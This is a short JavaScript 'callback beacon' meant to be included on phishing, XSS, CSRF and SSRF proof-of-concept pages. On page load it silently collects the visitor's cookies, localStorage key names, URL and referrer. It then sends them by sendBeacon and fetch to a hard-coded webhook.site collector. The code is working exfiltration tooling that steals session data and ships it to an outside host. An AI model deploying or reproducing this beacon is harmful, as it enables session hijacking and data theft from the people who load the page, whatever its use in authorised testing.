/**
 * Universal callback beacon — include on any PoC page to report events to the collector
 * Usage: beacon('xss', 'reflected-img', {extra: 'data'})
 */
var WEBHOOK = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';

function beacon(category, testName, extraData) {
    var payload = {
        category: category,
        test: testName,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        cookies: document.cookie || '(none)',
        localStorage_keys: Object.keys(localStorage),
        data: extraData || {}
    };
    // Primary: sendBeacon to webhook.site
    try { navigator.sendBeacon(WEBHOOK, JSON.stringify(payload)); } catch(e) {}
    // Backup: fetch
    try {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(function(){});
    } catch(e) {}
}

// Auto-beacon page load
(function() {
    var path = window.location.pathname;
    var cat = 'unknown';
    if (path.indexOf('/phishing') !== -1) cat = 'phishing';
    else if (path.indexOf('/xss') !== -1) cat = 'xss';
    else if (path.indexOf('/csrf') !== -1) cat = 'csrf';
    else if (path.indexOf('/ssrf') !== -1) cat = 'ssrf';
    else if (path.indexOf('/bypass') !== -1) cat = 'bypass';
    beacon(cat, 'page-load', {path: path, referrer: document.referrer});
})();
